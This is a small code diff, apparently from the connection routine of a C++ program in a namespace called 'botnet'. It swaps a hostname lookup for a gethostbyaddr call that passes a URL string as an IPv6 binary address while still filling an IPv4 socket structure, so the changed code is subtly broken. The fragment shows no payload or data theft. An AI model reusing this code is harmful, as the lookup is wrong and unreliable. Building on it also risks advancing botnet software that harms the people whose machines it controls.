@@ -34,7 +34,8 @@ namespace botnet {
             Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
             struct hostent *host;
-            host = gethostbyname(_url.c_str());
+            host = gethostbyaddr(_url.c_str(), 16, AF_INET6);
+            //host = gethostbyname(_url.c_str());
 
             SOCKADDR_IN SockAddr;
             SockAddr.sin_port = htons(_port);
